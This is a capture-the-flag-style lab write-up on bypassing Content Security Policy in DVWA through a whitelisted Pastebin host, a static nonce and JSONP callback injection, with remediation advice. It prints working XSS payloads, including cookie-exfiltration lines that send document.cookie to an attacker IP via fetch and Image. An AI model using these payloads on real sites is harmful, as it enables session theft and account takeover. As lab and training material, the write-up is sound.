# Lab Write-Up: Content Security Policy (CSP) Bypass
**Date:** 2026-09-17  
**Author:** Adinath Dubile  
**Lab Environment:** DVWA (Damn Vulnerable Web Application)  
**Difficulty Levels Tested:** Low | Medium | High  
**Category:** Misconfiguration / Security Headers  
**OWASP Top 10:** A05:2021 – Security Misconfiguration  

---

## 1. Introduction

Content Security Policy (CSP) is a browser security mechanism designed to prevent Cross-Site Scripting (XSS) and other code injection attacks. It works by defining a whitelist of trusted sources for scripts, styles, and other resources. However, a misconfigured or overly permissive CSP can still be bypassed — this lab demonstrates several bypass techniques.

**Goal of this lab:** Analyze the CSP headers in DVWA and exploit misconfigurations to execute arbitrary JavaScript despite the CSP being in place.

---

## 2. Environment Setup

| Component        | Details                              |
|------------------|--------------------------------------|
| **Target App**   | DVWA – CSP Bypass Module             |
| **Attacker OS**  | Kali Linux                           |
| **Tools Used**   | Browser (DevTools), Burp Suite       |
| **Network**      | Local lab (NAT/Host-Only)            |

---

## 3. Vulnerability Overview

### What is CSP?

CSP is delivered as a response header:
```
Content-Security-Policy: default-src 'self'; script-src 'self' https://trusted.com
```

This tells the browser:
- Only load scripts from `'self'` (same origin) or `https://trusted.com`
- Block any inline `<script>` tags
- Block scripts from any other domain

**Common CSP Bypass Vectors:**
- Hosting malicious scripts on a trusted/whitelisted CDN
- Exploiting non-rotating nonces
- JSONP callbacks on whitelisted domains
- `unsafe-inline` or `unsafe-eval` in the policy

---

## 4. Exploitation

### 4.1 Low Security Level

**Setup:** Navigate to DVWA → CSP Bypass. Set security to **Low**.

#### Step 1 – Check the CSP Header

Open DevTools → Network → reload the page → click on the main request → Headers:

```
Content-Security-Policy: script-src 'self' https://pastebin.com https://hastebin.com https://www.toptal.com/developers/hastebin/
```

**Analysis:** The policy allows scripts from Pastebin and Hastebin — these are **user-controlled** external services where anyone can upload content.

#### Step 2 – Upload a Script to a Whitelisted Host

Create a JavaScript payload and host it on a whitelisted service (the DVWA challenge form accepts a URL):

**Option A – Using Pastebin (raw URL):**
1. Create a Pastebin with:
   ```javascript
   alert(document.cookie)
   ```
2. Get the raw URL: `https://pastebin.com/raw/XXXXXXXX`

**Option B – Using a local alternative:**
If external services are blocked/inaccessible in the lab, host on `127.0.0.1`:
```bash
echo "alert(document.cookie)" > /var/www/html/xss.js
```
Then use: `http://localhost/xss.js` (if `self` includes localhost in this context)

#### Step 3 – Submit the Script URL

The DVWA CSP page has an input field. Enter the raw URL of your script and submit:

```
https://pastebin.com/raw/XXXXXXXX
```

**Server Action:** The page dynamically creates a `<script>` tag pointing to your URL:
```html
<script src="https://pastebin.com/raw/XXXXXXXX"></script>
```

**Result:** Browser loads and executes your script — alert fires ✅

> **Note:** Pastebin and similar services may add headers preventing cross-origin loading. If blocked, use a locally hosted file at an IP address within the CSP's scope.

---

### 4.2 Medium Security Level

**Setup:** Set security to **Medium**.

#### Step 1 – Check the CSP Header

```
Content-Security-Policy: script-src 'self' 'nonce-TmV2ZXIgZ29ubmEgZ2l2ZSB5b3UgdXA='
```

**Analysis:** A `nonce` is present. Nonces are meant to be **random and unique per request** — they whitelist specific inline `<script>` tags.

The correct usage:
```html
<script nonce="RANDOM_VALUE">alert(1)</script>  <!-- Only this executes -->
```

#### Step 2 – Check if the Nonce Rotates

Reload the page several times and inspect the `nonce` value in the CSP header each time.

**Observation:** The nonce value is **the same across all requests** — it never changes!

This defeats the purpose of nonces entirely. A static nonce is equivalent to `unsafe-inline`.

#### Step 3 – Use the Static Nonce

Copy the nonce value from the CSP header:
```
nonce-TmV2ZXIgZ29ubmEgZ2l2ZSB5b3UgdXA=
```

Inject a `<script>` tag with that nonce. Use the XSS vulnerability in the DVWA page (the input field) to inject:

```html
<script nonce="TmV2ZXIgZ29ubmEgZ2l2ZSB5b3UgdXA=">alert(document.cookie)</script>
```

**How to inject:** Use Burp to intercept the response and inject this into the page body, OR if there's an input that reflects content, insert it there.

**Result:** Alert fires — static nonce bypassed ✅

---

### 4.3 High Security Level

**Setup:** Set security to **High**.

#### Step 1 – Check the CSP Header

```
Content-Security-Policy: script-src 'self'
```

Only scripts from the same origin are allowed. No unsafe-inline, no nonce needed.

#### Step 2 – Find a JSONP Endpoint

The DVWA module has a "Solve the sum" button. Intercept that request in Burp:

**Intercepted GET request:**
```
GET /dvwa/vulnerabilities/csp/source/jsonp.php?callback=solveSum HTTP/1.1
```

**Server response:**
```javascript
solveSum({"answer":"15"})
```

This is a **JSONP endpoint** — it wraps a JSON response in a function call specified by the `callback` parameter.

#### Step 3 – JSONP Callback Injection

The `callback` parameter is used directly in the response without sanitization. Modify it to inject arbitrary JavaScript:

**Modified request (via Burp):**
```
GET /dvwa/vulnerabilities/csp/source/jsonp.php?callback=alert(document.cookie)// HTTP/1.1
```

**Server response:**
```javascript
alert(document.cookie)//({"answer":"15"})
```

The browser executes this response as a `<script>` from `'self'` — CSP passes, alert fires! ✅

#### Step 4 – Full Cookie Exfiltration via JSONP

**Payload:**
```
?callback=fetch('http://192.168.x.x:8081/?c='+document.cookie)//
```

**Or:**
```
?callback=new Image().src='http://192.168.x.x:8081/?c='+document.cookie//
```

**Result:** Cookie exfiltrated — full CSP bypass via JSONP. ✅

---

## 5. CSP Misconfiguration Summary

| Level | CSP Policy                        | Flaw                           | Bypass                   |
|-------|-----------------------------------|--------------------------------|--------------------------|
| Low   | Whitelisted external CDNs         | User-controlled CDN content    | Upload script to CDN     |
| Medium| Static nonce                      | Nonce doesn't rotate           | Reuse nonce in `<script>`|
| High  | `script-src 'self'`               | JSONP callback injection       | Inject JS via callback   |

---

## 6. Findings Summary

| Security Level | Vulnerable | Bypass Method              | Outcome         |
|----------------|------------|----------------------------|-----------------|
| Low            | ✅ Yes     | Whitelisted CDN abuse      | JS executed     |
| Medium         | ✅ Yes     | Static nonce reuse         | JS executed     |
| High           | ✅ Yes     | JSONP callback injection   | Cookie stolen   |

---

## 7. Impact Assessment

| Category       | Rating   |
|----------------|----------|
| **Severity**   | High     |
| **CVSS Score** | 7.4      |
| **CIA Impact** | Confidentiality: High, Integrity: Medium, Availability: Low |

**Business Impact:**
- Bypasses the organization's XSS defenses
- Session cookie theft → account takeover
- CSP gives false sense of security while still exploitable
- Demonstrates that CSP is a mitigation layer, not a complete solution

---

## 8. Remediation Recommendations

| Fix                             | Description                                                     |
|---------------------------------|-----------------------------------------------------------------|
| **Rotate Nonces Per Request**   | Generate a new cryptographically random nonce per page load    |
| **Avoid Whitelisting User CDNs**| Pastebin, GitHub, etc. allow attacker uploads — don't whitelist|
| **Remove JSONP Endpoints**      | Replace JSONP with CORS + JSON responses                       |
| **Sanitize Callback Parameter** | Validate callback against a whitelist of function names        |
| **Strict CSP**                  | Use `strict-dynamic` with nonces instead of URL-based lists   |
| **CSP Violation Reporting**     | Add `report-uri` or `report-to` to monitor CSP violations      |

**Strong CSP Header:**
```
Content-Security-Policy: 
  default-src 'none'; 
  script-src 'nonce-{RANDOM_PER_REQUEST}' 'strict-dynamic'; 
  style-src 'self'; 
  img-src 'self' data:; 
  connect-src 'self'; 
  frame-ancestors 'none'; 
  report-uri /csp-report
```

---

## 9. References

- [MDN – Content Security Policy](https://developer.mozilla.org/en-US/docs/Web/HTTP/CSP)
- [PortSwigger – Bypassing CSP](https://portswigger.net/web-security/cross-site-scripting/content-security-policy)
- [Google CSP Evaluator](https://csp-evaluator.withgoogle.com/)
- [DVWA CSP Bypass Walkthrough – ch3ngo](https://ch3ngo.github.io/posts/csp-bypass_dvwa_walkthrough/)
- [DVWA CSP Bypass – cspanias](https://cspanias.github.io/posts/DVWA-CSP-Bypass)

---

## 10. Proof of Concept (PoC) Summary

```
Target:    DVWA – CSP Bypass Module
Medium:    Static nonce TmV2ZX... reused in injected <script> tag → executed
High:      JSONP callback ?callback=alert(document.cookie)// → JS executed from 'self'
Result:    CSP bypassed, arbitrary JS executed, cookie stolen
Severity:  HIGH (CVSS 7.4)
```

---

*Write-up created for portfolio/educational purposes only. All testing performed in an isolated lab environment.*
